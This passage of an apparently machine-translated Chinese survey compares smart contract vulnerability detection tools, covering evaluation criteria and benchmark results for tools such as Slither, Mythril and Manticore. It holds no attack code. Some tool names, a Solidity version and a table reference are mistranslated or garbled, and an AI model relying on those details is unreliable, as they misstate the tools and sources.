-EVM检测器（Norvill等人，2018年）：EEVM于2018年发布，模拟并可视化了以太坊sc在EVM上的执行。它直观地表示了每个执行步骤的合约控制流图、操作码和堆栈状态，帮助用户理解EVM操作和合约行为。该工具可以方便地识别循环、优化候选项和跟踪执行路径，从而帮助检测诸如“重新进入问题”和“无效跳转目的地”之类的漏洞。\nErays-detector (Zhou et al., 2018b)：于2018年开发，它是一个用Python实现的逆向工程工具，旨在将以太坊sc从EVM字节码反编译为高级伪代码。Erays增强了对不透明sc的理解，提供了对代码复杂性和代码重用的洞察，并为没有公开可用源代码的合同启用了部分源代码恢复。\neir - detector (Albert et al., 2018): EthIR（以太坊中间表示）是2018年引入的用于以太坊字节码高级分析的框架。它使用Oyente生成的cfg分析以太坊字节码，并生成字节码的基于规则的表示（RBR）。EthIR检测诸如“与气体相关的低效率”、“无界循环”和“潜在的拒绝服务攻击”等漏洞。\nInvCon - detector (Liu and Li, 2022): InvCon是以太坊sc的动态不变性检测工具。它使用历史事务数据来推断不变量，帮助逆向工程和遵从性检查。InvCon于2022年发布，具有基于web的界面和Python和Java的后端，用于数据跟踪生成和不变量检测。InvCon帮助识别漏洞，如不变性违规、与ERC20标准规范的不一致，以及SCs实现中潜在的不合规问题。\nSmart-Graph - detector (Pierro, 2021): Smart-Graph是2021年开发的一种基于网络的工具，可为Solidity sc生成增强的统一建模语言（UML）类图。它使用后端API来获取合约源代码，并创建可视化表示，其中包括特定于solid的功能，如函数修饰符和回退函数。Smart-Graph帮助开发人员可视化合同架构，帮助识别诸如“代码过于复杂”和“潜在交互流问题”等问题。\nSolGraph - detector (Revere, 2018): SolGraph于2018年发布，生成DOT图，以可视化Solidity合约中函数的控制流，并突出潜在的安全漏洞。它用不同的颜色标记函数和操作，以表示它们的类型，例如外部发送、常量函数和传输。SolGraph通过图形表示帮助开发人员理解合约行为并识别漏洞。\nSlither - identifier (Feist等人，2019):Slither是以太坊sc的静态分析框架，可将solid代码转换为称为SlithIR的中间表示。这种表示使用SSA形式来保存语义信息，促进数据流和污染跟踪分析。Slither于2019年推出，提供自动漏洞检测、代码优化和增强的代码理解。它可以检测“重入”、“变量阴影”、“未初始化变量”、“自杀式合约”、“锁定以太币”和“任意发送以太币”。\n\n\n可视化分析工具通过将代码转换为可视化表示，为检查和解释SCs提供了一种有价值的方法。这种转换有助于识别潜在的缺陷，并深入了解契约逻辑和执行流程。这里列出的工具展示了可视化如何支持sc分析，使复杂的代码结构更容易理解。\n总之，本节探讨了用于分析和保护sc的各种工具和方法，例如运行时验证、符号执行和模糊测试。如表3所示，每种方法中工具的数量突出了基于人工智能的方法和符号执行的重要性，它们的数量最高，分别为57和56个工具。这表明，这些方法在解决复杂的SCs脆弱性方面具有很强的适应性和有效性。另一方面，像代码插装和控制流分析这样的方法有更少的工具，这表明潜在的差距或对这些方法的依赖更少。这一分析不仅强调了人工智能和象征性执行在该领域的主导作用，还指出了可能需要进一步发展和创新的领域，以为SCs安全提供更全面的工具包。\n为了更好地理解景观，图3将呈现的信息可视化。这个系统的组织提供了一个全面的路线图，帮助开发人员和研究人员快速导航可用的工具，选择那些最能满足他们特定需求的工具，并识别现有方法中的潜在差距。这种有组织的视图有助于将工具选择与特定的安全目标结合起来，最终提高sc实现的安全性。\n本节确定了由不同工具检测到的各种各样的漏洞。由于存在大量的漏洞，因此将它们划分为更广泛的组，如表5和表6所示。第一个表侧重于功能漏洞，而第二个表则突出了结构或设计漏洞。这种分类允许进行更加结构化和精确的分析，从而更容易地评估哪些工具和方法在检测特定类型的漏洞时最有效。\n此外，表4清楚地概述了各种方法如何处理不同类别的漏洞。诸如基于人工智能的方法、模糊测试、运行时验证、符号执行、形式化验证、模式匹配和语法分析等方法都展示了显著的适应性。由于这些方法可以处理多种类型的漏洞，因此当需要全面的漏洞检测策略时，它们特别有效。在必须应对不同类型风险的情况下，这些方法可能至关重要，为SCs提供更全面的保护。\n相比之下，抽象解释、控制流分析、反汇编分析和可视化分析等方法的适用性有限，只关注较少的漏洞类型。这可能意味着在漏洞检测中扮演更专业的角色，在分析中提供深度而不是广度。这些类别的总体覆盖范围显示了对常见问题的优先级，如与气体相关的漏洞、可重入性和调用问题、访问控制、安全性以及逻辑或数据流问题。然而，像地址和函数调用问题、可见性和范围问题以及数学和计算错误等领域显示出跨方法的最小检测，表明当前工具可能不那么有效的潜在差距。这为进一步研究和开发工具提供了机会，以提高代表性不足地区的覆盖率。\n虽然一些方法提供了广泛的覆盖范围，但没有一种方法能够全面地解决所有的漏洞。这强调了需要一种组合方法，集成多种方法来有效地覆盖代码级和系统级漏洞。通过认识每种方法的优势和局限性，研究人员和开发人员可以专注于未来的工作，以增强SCs的安全性，填补已发现的空白，并推动漏洞检测欠发达领域的创新。\n5 评估标准、分析和讨论评估SCs检测工具需要有条理的方法来确保准确性和相关性。在通过搜索和筛选确定一套全面的工具后，进行系统评估。已确定的工具分为两组：工业工具和学术工具。这种划分允许进行更详细的评估，因为这两个领域中工具的优先级和需求有很大的不同。因此，每个小组都使用一套特定的标准进行评估，以确保进行彻底的评估，以满足工业界和学术界的特定需求。本节中的评估基于各自作者在工具的技术文档中提供的详细信息。以下小节分析了静态、动态和混合类别，并彻底解释了用于他们比较的标准。之所以选择这种分类，是因为它与SCs分析中使用的核心技术相一致，使其成为评估的实用框架。\n5.1. 评估学术工具在SCs安全领域，学术工具在研究和分析中发挥着至关重要的作用，因为它们推动了创新的边界，并为新出现的漏洞提供了更深入的见解。为了评估这些工具的有效性和能力，我们采用了一套针对学术研究的独特要求量身定制的特定标准。这些标准确保这些工具在识别漏洞方面是有效的，适应于不同的研究场景，充分记录透明度和可重复性，并能够与现有的研究基础设施集成。本评估确定并采用以下标准：\n\n灵活性：评估了该工具对各种SCs平台的适应性，因为这对于其在各种研究中的适用性至关重要的的场景\n详细的文档和出版物：评估文档和出版物的可用性和全面性，反映工具的透明度和可靠性。\n集成能力：该工具与现有系统和工具集成的能力被考虑在内，促进其无缝集成到研究工作流程中。\n全面覆盖：评估了该工具有效处理大范围SCs漏洞的能力，确保了彻底的分析。\n自动化：评估该工具以确定它是否提供自动化功能，这可以显著影响学术研究过程的效率。\n可靠的测试和评估：使用真实世界的SCs数据集进行测试和验证评估。这个评估展示了该工具对实际场景的适用性。\n可扩展性：考虑了工具的扩展和定制潜力。这突出了它对不断发展的研究需求和未来应用的适应性。\n\n5.1.1. 评估静态分析工具静态分析工具在评估SCs安全性的学术工具中尤为重要，因为它们可以在不执行代码的情况下分析代码。本节侧重于静态学术工具，检查它们在检测sc漏洞方面的能力和有效性。对静态学术工具的评估对于理解它们的能力和需要改进的领域是至关重要的。表7提供了这些工具的比较细节。\n在此评估中，前20%的工具始终满足大多数或所有标准，显示出高总体质量。这些工具，如ESCORT和SoliDetector，具有出色的灵活性、全面的文档和强大的集成能力。它们在自动化和可扩展性方面也表现良好，使它们对各种应用程序具有高度的适应性和效率。跨多个标准的一致性表明这些工具是健壮且开发良好的，为用户提供了重要的价值。\n中间60%的工具表现出对标准的适度遵从，通常在某些领域表现出色，而在其他领域则缺乏。像sCompile和Zeus这样的工具通常展示了良好的灵活性和集成能力，但通常缺乏可扩展性。这种可变性表明，虽然这些工具很有用，但它们可能需要额外的功能或改进才能完全满足所有用户的需求。这些领域突出了有针对性的改进机会，以提高其整体有效性。\n底部20%的工具满足的标准最少，这表明有很大的改进空间。孔隙度和ecker通常缺乏自动化、全面覆盖和可扩展性。这些缺陷限制了它们在更复杂或要求更高的场景中的可用性和适用性。分析表明，这些工具需要大量的开发来解决这些缺点，并更紧密地与用户的期望和需求保持一致。\n从这个评估中产生了几个关键的见解。首先，许多工具在灵活性、文档和集成能力方面的实力令人鼓舞，这表明开发人员优先考虑用户适应性和易用性。然而，许多工具普遍缺乏自动化和全面覆盖是一个问题。这些差距意味着用户在分析中可能面临大量的手工工作和有限的范围，从而降低了整体效率。此外，许多工具缺乏可扩展性，限制了它们未来的可伸缩性和对不断变化的需求的适应性。\n为了解决这些问题，未来的开发工作应该集中在增强工具的自动化和全面覆盖上。合并更多的自动化流程可以显著减少用户工作量并提高效率。扩大覆盖范围可确保工具能够处理更广泛的场景和问题，提供更全面的解决方案。此外，增加工具的可扩展性将允许更好地适应新的挑战并集成到不同的系统中。这些增强将有助于开发更健壮、通用和用户友好的工具，以满足学术界不断发展的需求。\n5.1.2. 动态分析工具的评估评估用于SCs安全的动态学术工具对于确定其优势和需要改进的领域至关重要，因为这些工具可以检测运行时漏洞。这些工具的能力及其在检测安全系统内漏洞方面的有效性。这些工具的详细比较见表8。\n前25%的工具，如ContractLarva、ModCon和SODA，表现出高度的灵活性、详细的文档和发布、集成能力、自动化和全面的覆盖。这些工具展示了对各种SCs平台的适应性，使其适用于各种研究场景。它们提供透明的文档，确保可靠性和易用性。它们的集成能力非常强大，可以无缝地集成到现有的研究工作流程中。此外，这些工具提供了自动化功能，显著提高了学术研究过程的效率。它们的全面覆盖确保了对广泛的安全漏洞进行彻底分析，使其成为详细研究的必要条件。\n中间50%的工具，包括GFuzzer、DappGuard和EVMFuzzer，在各个类别中都表现出优势和劣势。虽然这些工具通常提供灵活性和全面的覆盖范围，但它们在使用可靠的测试、评估和可扩展性等方面往往存在不足。文档的质量各不相同，有些工具提供详细的指导，而有些工具缺乏足够的信息。集成功能是足够的，但不如顶级工具中的功能健壮。自动化是存在的，但没有得到一致的实施，这表明在提高研究效率方面还有改进的余地。这些工具可以处理许多sc漏洞，但需要在其他领域进行增强才能充分发挥其潜力。\n底层25%的工具，如RLRep、SeqFuzz和EVM，通常缺乏多个关键领域，包括灵活性、集成能力以及可靠测试和评估的使用。这些工具通常具有有限的文档，使得用户难以采用和有效地利用它们。自动化特性很少，需要更多的人工干预，这可能导致更多的错误和低效率。它们的全面覆盖限制了对不同SCs漏洞的适用性。此外，它们缺乏可扩展性适应未来研究需求和发展的挑战，使它们在不断变化的情况下不那么通用。\n可以提出一些建议，以提高动态学术工具的整体效用。首先，增加对真实数据集的集成将提高这些工具的实用性和可靠性。其次，增强所有工具之间的文档将支持用户采用和有效利用。第三，提高集成能力将促进更容易的采用和更广泛的使用。此外，增加自动化功能将提高效率并减少人工干预。最后，扩展工具的可扩展性将确保它们随着时间的推移保持相关性和有用性，以适应不断发展的研究需求和未来的应用。\n5.1.3. 混合分析工具的评估混合学术工具对于sc分析至关重要，因为它们结合了静态和动态分析技术来解决漏洞并增强安全性。这些工具利用了这两种方法的优点，为检测sc中的问题提供了更全面的解决方案。研究人员可以通过比较混合工具来发现它们的优缺点，从而开发出更好的工具。这些工具的比较见表9。\n排名前30%的混合学术工具，如SmartBugs、KEVM、Vultron、WANA和FSPVM-E，在灵活性、详细的文档和发布、集成能力、自动化、全面覆盖、真实数据集使用和可扩展性方面表现出色。这些工具很好地适应了各种sc平台，并提供了大量文档，确保了可靠性和易用性。它们可以顺利地集成到现有的工作流程中，并提供自动化以提高研究效率。它们的全面覆盖允许对SCs的脆弱性进行彻底分析。使用可靠的测试和评估确保了实用性，其可扩展性支持了未来的研究需求。\n中间的50%的工具，包括MuSc、孔子、ESAF、SecSEC和Smartian，显示出优点和缺点的混合。这些工具通常提供灵活性和文档，但与顶级工具相比，它们的集成和自动化特性不那么健壮。虽然它们处理了许多SCs的漏洞，但覆盖范围并不广泛。它们的可靠测试和评估用途各不相同，限制了一些的实际适用性。可扩展性是另一个需要改进的领域，因为许多工具不容易适应未来的研究需求。\n排名最后20%的工具，如TEEther、solidaudit和HAM，在多个关键领域都缺乏。这些工具通常具有有限的灵活性、最少的文档和较弱的集成能力，使得它们难以在现有工作流中使用。自动化是有限的，需要大量的手工工作，导致错误和效率低下。他们的全面覆盖受到限制，降低了他们处理各种安全漏洞的能力。缺乏真实数据集的使用和可扩展性限制了它们的实际使用和对未来需求的适应性。\n基于上述分析，可以总结出几种改进混合学术工具的方法。第一，增强工具的灵活性，使其适应不同的SCs平台。应该改进文档以支持用户采用并提供必要的指导。应该增强集成功能，以便更容易地在工作流中采用。最后，将可靠的测试与评估相结合，提高这些工具的可靠性和实用性。\n对学术sc漏洞工具的综合分析基于七个关键特征对每个工具进行评估。该评估确定了这些工具中存在的显著差异。值得注意的是，大多数学术工具在诸如详细的文档和出版（237个工具）、自动化（223个工具）、可靠的测试和评估（214个工具）以及全面的覆盖（192个工具）等方面表现出色。然而，在灵活性（24个工具）和集成能力（50个工具）等类别中观察到明显的不足。可扩展性也显示出改进的空间，只有62个工具符合这一标准。\n总之，虽然学术工具通常提供健壮的文档和自动化，但迫切需要增强它们的灵活性、集成能力和可扩展性。未来在开发学术SCs漏洞工具方面的努力应该改进这些方面，以确保更广泛的适用性，无缝集成到研究工作流程中，并能够适应不断变化的研究需求。\n5.2. 评估行业工具对SCs漏洞检测工具的评估超越了学术兴趣，满足了现实世界应用的实际需求。在安全性和可靠性至关重要的行业环境中，对这些工具的全面评估涉及更广泛的标准集。此评估旨在确保所选择的工具有效地识别漏洞并与业务的操作需求保持一致。本评估确定并采用以下标准：\n\n灵活性：评估了该工具对各种SCs平台的适应性，因为这对于其在不同行业环境中的适用性至关重要。\n可用性和用户体验：评估工具的易用性和整体用户体验，因为这些因素对于专业环境中的采用和有效利用至关重要。\n可伸缩性和性能：评估了该工具有效处理大规模SCs分析的能力，这是企业级应用程序的关键需求。\n集成能力：评估了该工具与现有系统和工作流无缝集成的能力，这可以节省时间并改善安全操作。\n支持：检查用户支持的可用性，包括文档、教程和客户服务。在工业环境中，有效的用户支持对于故障排除和最大化工具的有效性至关重要。\n维护和更新：评估定期更新计划的存在，确保工具保持有效和最新。\n详细的文档和出版：评估文档的可用性和清晰度。清晰的文档可以促进用户理解，促进采用，并增强工具的可信度。\n自动化：对该工具进行评估，以确定它是否提供自动化功能，从而加快行业设置中的漏洞检测过程\n全面覆盖：评估了该工具检测大范围SCs漏洞的能力，确保其识别潜在风险的有效性。\n可靠的测试和评估：评估工具以确定它是否使用真实世界的数据集进行验证和测试。该评估表明了该工具对真实场景的适用性。\n可用性和开源：工具的可用性，无论是开放的还是商业许可的，都要考虑，因为这会影响可访问性和透明度。\n详细的漏洞报告：评估工具为修复或减轻检测到的漏洞提供可操作建议的能力，这对修复工作有很大帮助\n修复&#x2F;缓解建议：评估工具为修复或缓解检测到的漏洞提供实用建议的能力，因为这可以显著加快修复过程。\n可扩展性：考虑了该工具合并其他功能或特性的潜力，确保其对该领域未来需求和进步的适应性。\n\n与用于学术工具的方法类似，我们使用相同的方法来比较行业工具。这些工具分为三类：静态5.2.1、动态5.2.2和混合5.2.3，每种工具都附有一个比较表（表10、11和12）。根据上述标准对它们进行二元评估（是&#x2F;否），以确定是否存在特定特征。然后根据它们满足的标准数量对工具进行排序，满足更多标准的工具排名更高。这确保了公平和清晰的比较，突出每个工具的优点和缺点，并为未来的改进提供有价值的见解。\n5.2.1. 评估静态分析工具对SCs脆弱性的静态行业工具的评估揭示了一个具有优势和劣势的景观。如表10所示，一个值得注意的观察是，详细的文档和自动化在工具中广泛可用。这是令人鼓舞的，因为完整的文档可以帮助用户有效地理解和利用这些工具，而自动化功能减少了手工工作并简化了流程。Slither、SoMo和SmartCheck等工具体现了这一趋势，为用户提供指导和自动化功能。\n然而，在其他领域存在显著差距。灵活性和集成功能通常不会在工具之间共享，这可能会限制它们对不同用户需求和环境的适应性。例如，虽然SmartCheck因其集成能力而脱颖而出，但许多其他工具都存在不足，这可能会阻碍它们在各种场景中的可用性。此外，诸如可伸缩性和性能之类的质量仅在一些工具（如SoMo）中得到强调，这表明需要更健壮的解决方案来有效地处理大规模应用程序。\n另一个值得关注的领域是对可用性和用户体验的有限关注。尽管Ethlint和Solhint在这方面做出了显著的努力，但大多数工具都没有优先考虑用户友好的界面或体验，这可能成为广泛采用的障碍，特别是对于可能不太懂技术的用户。此外，全面覆盖和真实世界数据库并不是广泛实现的特性，只有Slither和Cider在这些方面表现出优势。缺乏广泛的覆盖意味着许多工具可能无法解决所有潜在的漏洞或场景，从而降低了它们的有效性。\n支持和维护也是许多工具可以改进的关键领域。虽然像Rattle和Solhint这样的工具提供了良好的支持和定期更新，确保用户可以依靠它们来满足持续的需求，但许多其他工具并没有提供相同级别的承诺。这可能导致使用过时的工具，并使用户感到沮丧，因为他们缺乏解决问题的帮助，或者无法及时了解最新的安全挑战。\n必须采取综合办法来解决这些缺点。首先，增加这些工具的灵活性和集成能力将使它们在各种环境中更具适应性和价值。开发人员应该考虑模块化体系结构并提供api，以便更好地与其他系统集成。其次，增强可用性和性能将使这些工具更易于访问和高效，从而鼓励更广泛的采用。应该优先考虑定期的性能优化和用户界面改进。\n此外，扩大覆盖范围和整合真实世界的数据库将提高工具分析的准确性和相关性，使它们在解决漏洞方面更加可靠。维护文档和提供支持对于用户满意度和工具可靠性也是必不可少的。最后，创建更多的开源工具可以促进社区的贡献和改进，从而产生更好的工具。通过解决这些问题，静态行业工具的开发和采用可以得到显著改进，从而产生更好的安全性实践。\n5.2.2. 动态分析工具的评估探索动态行业工具对SCs脆弱性的评估揭示了其优势和不足。如表11所示，在四种工具（manticore、Echidna、Harvey和pakala）中，某些特性始终存在，突出了它们的优势。所有工具都提供了详细的文档，并且是开源的。这些共同的品质确保了这些工具为用户提供全面的指导，并且是可访问和透明的。Manticore、Echidna和Harvey共享可扩展性和性能、集成能力、维护和更新、详细文档、自动化、全面覆盖、可靠的测试和评估以及可扩展性。这些特征表明它们能够处理大规模分析，与其他系统无缝集成，定期更新，自动化功能，广泛的漏洞检测，适用于现实世界的场景，以及未来增强的潜力，使它们成为各种场景的健壮选项。\n尽管有这些优势，评估也揭示了这些工具的不足之处。最重要的差距是修复&#x2F;缓解建议类别，没有任何工具提供这一类别。这对于帮助用户处理和修复已识别的漏洞至关重要。此外，Harvey和Pakala缺乏支持类别，影响了用户获得帮助和有效解决问题的能力。在Echinda和Harvey中缺少详细的漏洞报告，限制了它们彻底评估漏洞的能力。灵活性是另一个问题，Echinda、Harvey和Pakala没有提供此功能，这可能会影响工具对各种平台的适应性。\n关键是要解决已确定的弱点，以提高未来动态行业工具的有效性。集成修复&#x2F;缓解建议将通过提供可操作的步骤来解决检测到的漏洞，从而提高工具的实用性。加强支持服务，确保用户可以获得必要的帮助，以优化工具的使用。详细的漏洞报告应该是提供洞察力的标准特性。此外，提高灵活性将使工具更适应各种平台。通过解决这些问题，未来的工具可以变得更加健壮、用户友好和有效。\n5.2.3. 混合分析工具的评估评估用于SCs分析的混合行业工具突出了用于SCs分析的四种混合行业工具中的几个优势。如表12所示，这四种工具在灵活性、自动化、全面覆盖和可扩展性方面表现出色。这些优点表明该工具可以处理各种SCs分析任务。其中三个工具还因其可伸缩性和性能、集成能力、支持和开源可用性而脱颖而出。这些方面表明，这些工具可以有效地处理大规模分析，与现有系统很好地集成，提供可靠的用户支持，并且作为开源解决方案保持可访问性和透明性。这些特性使得这些工具在管理各种行业环境中的漏洞方面可靠而有效。\n然而，尽管有这些优势，评估也揭示了可能影响这些工具整体效用的重大差距。一些工具缺乏详细的文档，阻碍了用户的理解和有效的利用。具体的工具中也缺少详细的漏洞报告和修复建议，这些工具对于帮助用户快速解决已识别的问题至关重要。可用性和用户体验是需要改进的领域；糟糕的设计会阻碍用户效率和满意度。这些差距突出了需要改进的领域，以确保这些工具符合工业环境中实际使用所需的高标准。\n可以提出一些建议来解决这些缺点并提高SCs分析工具的有效性。改进详细的文档将增强用户的理解并促进工具的使用。结合详细的漏洞报告和修复建议可以极大地帮助用户快速解决已确定的问题。增强用户体验设计将使工具更直观，更容易导航，提高整体用户满意度。通过专注于这些改进，混合行业工具可以更好地满足用户需求，并在未来提供更高效的SCs分析。\n在分析行业SCs漏洞工具时，考虑了专业应用所必需的各种关键类别。大多数工业工具在自动化（19个工具）、详细文档和发布（16个工具）以及全面覆盖（15个工具）方面表现出色。然而，在灵活性（4个工具）、可用性和用户体验（8个工具）、修复&#x2F;缓解建议（8个工具）和可扩展性（8个工具）方面发现了重大差距。\n总之，尽管行业工具通常在自动化和文档化方面表现良好，但是在灵活性、用户体验和提供可操作的漏洞修复建议方面仍有迫切的需求。未来的开发工作应该改进工具的适应性、易用性和减少漏洞的有效性。通过解决这些不足，行业工具可以更好地满足企业级应用的需求，为网络安全提供更全面的解决方案。\n6 SCs漏洞工具的实用分析本节介绍了sc漏洞检测工具的实际分析。工具的选择最初是基于它们从上一节的分数。对于行业工具，在14分中得分最高的是13分和11分，而对于学术工具，在7分中得分最高的是6分和7分。考虑的行业工具包括Mythril、Manticore、Echidna、Slither和Securify，考虑的学术工具包括SoliDetector、SIF、SMARTBUGS、KEVM、Vultron、Solc-Verify、WANA、FSPVM、ESCORT、FSolidM、MuSc、ConFuzzius、ESAF、SecSEC、SMARTBUGS 2.0、ModCon、sFuzz、SODA、WASAIUP、Vandal和Seraph。\n在测试期间，由于技术限制，一些工具无法执行。例如，Echidna需要Solidity 4.25或更高版本，这与我们数据集中使用早期版本的许多sc不兼容。此外，一些工具，如SoliDetector、Solc-Verify、ESAF、SecSEC、SmartBugs 2.0、WASAIUP、Seraph、SODA、Vultron和ESCORT，由于缺乏公开可用的代码或文档不足而被排除在外。一些工具，包括SIF、KEVM、MuSc和ModCon，没有进行测试，因为它们没有直接关注漏洞检测，而漏洞检测是本分析的主要目标。WANA虽然在理论上是灵活的，但也被排除在外，因为它依赖于特定的Solidity版本来将合同转换为WASM，这与我们数据集中的版本不兼容。最终，测试的工具——四个行业工具（Manticore、Mythril、Slither和Securify）和三个学术工具（ConFuzzius、sFuzz和Vandal）——是根据它们的可用性、与我们数据集中的solid版本的兼容性以及与漏洞检测的主要目标的一致性来选择的。\n用于测试的数据集基于HajiHosseinKhani等人（2024）提供的数据集。该数据集选择了1998个随机安全合约和1998个随机脆弱合约。更大的合约池可用于易受攻击的合约，每个合约都与特定类别的漏洞相关联。从这个池中，从9个合约中各选择相同数量的唯一随机合约漏洞类别：ExternalBug、GasException、MishandledException、Timestamp、TOD、UnusedReturn、CallToUnknown、Integer Under&#x2F;Overflow （IntegerUO）和Reentrancy。这些合同被合并成1998年脆弱合同的最后一套。测试在两个系统上进行：一个是英特尔酷睿i7-1370P CPU和32gb内存，另一个是英特尔酷睿i5-1240P CPU和30gb内存，都运行Ubuntu 22.04。这些工具在Docker环境（版本24.0.7）中执行，以确保一致的性能，并在执行期间减少系统特定的变化。\n这些工具的性能使用标准漏洞检测指标进行评估，包括真阳性（TP）、真阴性（TN）、假阳性（FP）和假阴性（FN）。TP衡量的是正确识别的漏洞，FN指的是错过的漏洞，TN指的是正确识别为无漏洞的安全合约，FP错误计算了那些被标记的漏洞。准确性表示正确识别的实际漏洞的百分比，从而深入了解每个工具在检测漏洞方面的有效性。计算精度是为了评估识别的准确性。召回用于衡量检测到多少实际漏洞。F1-Score平衡了准确率和召回率，作为这两个指标的调和平均值计算。执行时间，每个工具用于分析合约的持续时间被记录为最终度量。\n工具评估的结果显示在表13和14中，反映了测量漏洞检测性能的两种不同方法。在表12中，评估的重点是整体检测性能，不区分漏洞类型。在这里，每个工具都在数据集上运行，以查看它是否可以检测到一般的漏洞。如果一个工具将一个文件识别为易受攻击，不管具体的漏洞类型是什么，它都被视为真阳性（TP）。例如，如果一个文件包含可重入性漏洞，并且工具将其标记为易受攻击—而不必将其标识为可重入性—这将导致表13中的TP计数。此表中的假阴性（FN）表示有漏洞但被工具遗漏的文件，这意味着它根本没有检测到任何漏洞。真阴性（TN）和假阳性（FP）在两个表中是一致的，因为对非易受攻击文件和不正确标志的评估在两种方法之间不会改变。\n然而，在表14中，使用了一种更细粒度的方法，侧重于跨特定漏洞类型（多类分类）的检测准确性。在这里，数据集的结构与代表九个漏洞类别中的每一个的平等契约。在这种情况下，对于True Positive，工具必须检测漏洞并正确识别其类型。例如，如果合约包含GasException漏洞，那么只有当工具将其识别为GasException时，它才会是一个TP。如果工具检测到一个漏洞，但错误地标记了该类型，则不会将其计算为TP，而是将其添加到FN计数中。这种方法为每个工具准确识别不同类型漏洞的能力提供了更详细的视图。\n这七种漏洞检测工具的比较揭示了它们在功能上的显著差异，每个工具都显示出特定的优势和劣势。这些工具在检测精度、执行速度以及误报和误报率方面进行了不同的权衡，突出了创建一个安全的测试系统的挑战漏洞检测综合解决方案。\nSlither在二值分类中表现最好，准确率最高，达到92.3%，如表13和图4所示。这使得Slither能够有效地识别漏洞，特别是在时间有限的情况下，它的平均执行时间仅为2.5秒。然而，高误报率意味着用户必须花费额外的时间手动验证检测到的漏洞，从而降低了其有效性。这一限制表明，尽管Slither对第一次评估很有帮助，但它的输出需要大量的后续工作，这使得它在精度至关重要的环境中不太实用。\n与Slither相比，Manticore和Securify在二进制分类任务中表现不佳。Manticore的准确率仅为18.8%，Securify的准确率为33.9%。这两种工具的误报率和误报率也较高，这会影响它们检测漏洞的可靠性。Manticore的执行时间长达4439.0 s，这进一步限制了它的性能，使其不适合快速或大规模的分析。安全性的执行时间更快，为357.7秒，更接近Slither的速度，但它的低召回率表明它错过了许多漏洞，降低了它作为独立工具的有效性。尽管Manticore的表现在这些指标中似乎很弱，但其符号执行方法提供了更深入的分析，这在具体的详细审计场景中可能很有价值。\n此外，sFuzz提供了更平衡的性能，在保持中等精度和召回分数的同时，在二值分类中实现了67.5%的合理准确率。这种平衡表明，sFuzz可能适合于检测能力和总体准确性至关重要的用例。相比之下，Mythril的准确率相对较低（47.7%），并且执行时间较长，如图7所示，这可能会限制其实用价值，特别是在需要快速分析的场景中。高假阴性率进一步表明，Mythril经常无法识别许多漏洞，从而降低了其可靠性。Vandal的准确率仅为25.5%，在所有重要指标上的效用有限，检测质量差，速度慢，不如其他工具有效。\n在更复杂的多类分类场景中，如表14和图4所示，所有工具的性能都显著下降。在二元分类方面表现出色的Slither的准确率大幅下降，降至26.8%，这表明它在区分特定类型的漏洞方面存在困难。Manticore的准确率甚至进一步下降到12.0%，突出了它在分类复杂性增加方面的特殊挣扎。Securify在这方面也表现不佳，准确率仅为3.0%，是所有工具中最低的。Mythril在多类分类中达到了28.1%的最高准确率，但这个数字仍然很低，这表明即使是性能最好的工具也很难精确地识别特定类型的漏洞。所有工具的下降表明当前漏洞检测技术存在更大的局限性——随着复杂性的增加，无法保持准确性。\n详细查看特定漏洞的检测率，如表15和图5所示，显示了工具专门化的变化。Mythril在识别Integer Under&#x2F;Overflow漏洞方面表现出色（83.3%），并且在错误处理方面表现良好异常（68.0%），使得它适合于关注这些问题的用例。Slither对时间戳依赖性（41.4%）、GasException（27.5%）和错误处理异常（65.8%）的检测率相对较高，表明即使其总体覆盖范围有限，它也可以针对这些漏洞进行有效的检测。Manticore在Integer Under&#x2F;Overflow方面取得了不错的性能（40.5%），但对其他漏洞的检测率通常较低，这表明专业化程度较窄。\n相比之下，Securify和其他工具，包括confzzius、sFuzz和Vandal，显示出有限的有效性，在大多数类别中始终具有较低的检测率。例如，Securify在任何漏洞类型中的检测率都不超过5%，这限制了其作为独立检测工具的实用性。在所有工具中，某些漏洞，例如ExternalBug和Unused Return，具有特别低或不支持的检测率，突出了全面覆盖的总体限制。这一分析表明，虽然一些工具具有特定的优势，但组合多个工具或改进检测能力对于覆盖更大范围的漏洞是必要的。\n图6所示的执行时间进一步说明了这些工具的实际适用性。Slither和Vandal比它们的同类要快得多，这使得它们可能适合处理更大的数据集，或者在速度至关重要的情况下使用。然而，根据图7和图8，这种速度优势并没有转化为强大的检测性能，因为这两种工具在两种分类中都具有较低的准确性。相比之下，Manticore, confucius， sFuzz和Mythril的执行时间要长得多。Mythril确实达到了中等的准确性，但与其他方法一样，其较慢的速度并不能显著提高检测率，这表明速度和准确性之间的权衡是有限的。安全处于中间地带，速度适中，但准确性较低，难以在效率和有效的漏洞检测之间取得平衡。这些工具都没有达到理想的平衡，突出了增强工具开发或组合使用以提高覆盖率和准确性的需要。\n如图9所示，二元分类和多类分类的准确率、召回率和f1分数的比较进一步突出了这些工具的局限性。而在二元分类中表现出相对平衡的f1分的孔子则急剧下降在多类分类过程中的性能。这种模式表明，虽然这些工具可能能够识别一般漏洞，但它们缺乏准确区分特定类型漏洞所需的复杂性。有限的精度和高假阳性率，特别是在复杂的分类中，使得依赖这些工具进行详细的、多类别的漏洞分析具有挑战性。\n总之，本分析突出了当前SCs漏洞检测工具的优势和不足，显示出相当大的改进空间。Mythril是检测特定漏洞（如Integer Under&#x2F;Overflow）最强大的工具。该方法在多类分类中达到了最高的准确率，但其较长的执行时间限制了其快速分析的实用性。Slither以其在二进制分类中的高准确性和快速的执行速度而着称，使其适用于快速，广泛的评估。尽管如此，它的高假阳性率需要大量的人工验证。其他工具，如sFuzz、ConFuzzius和Vandal，显示出有限的有效性，低检测率和较慢的性能限制了它们的整体效用。Manticore在符号执行方面提供了一些深度，但在更广泛的漏洞检测方面存在执行时间长和准确性低的问题。总的来说，没有一个单一的工具可以达到全面脆弱性评估的准确性、速度和可靠性的理想平衡。未来的发展应该集中在提高检测精度、减少误报和提高分类精度上，使这些工具在现实世界的SCs安全中更加强大和实用。\n7 